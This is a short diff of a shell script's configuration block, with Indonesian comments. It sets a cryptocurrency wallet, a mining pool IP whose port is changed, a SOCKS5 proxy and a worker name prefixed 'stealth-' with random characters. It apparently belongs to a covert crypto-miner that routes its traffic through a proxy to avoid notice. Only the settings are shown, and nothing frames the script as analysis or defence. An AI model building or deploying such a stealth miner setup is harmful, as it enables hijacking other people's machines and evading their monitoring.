@@ -3,7 +3,7 @@ set -e
 
 # === KONFIGURASI ===
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-POOL="24.199.99.228:1935"
+POOL="24.199.99.228:9933"
 SOCKS5_IP="116.100.220.220"
 SOCKS5_PORT="1080"
 WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
